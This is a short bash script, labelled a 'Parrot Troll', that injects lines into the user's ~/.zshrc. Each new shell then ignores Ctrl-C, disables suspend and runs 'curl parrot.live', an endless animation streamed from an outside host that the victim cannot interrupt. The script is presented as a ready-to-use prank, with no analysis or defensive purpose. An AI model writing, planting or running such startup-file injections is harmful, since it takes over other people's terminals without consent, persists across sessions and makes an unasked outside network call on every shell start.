#!/bin/bash

code_to_inject=$(cat << 'EOF'
trap '' 2
stty susp undef
curl parrot.live
EOF
)

if ! grep -q "$code_to_inject" ~/.zshrc; then
    echo "$code_to_inject" >> ~/.zshrc
    echo "Parrot Troll successfully injected into ~/.zshrc"
else
    echo "Parrot Troll is already in ~/.zshrc"
fi
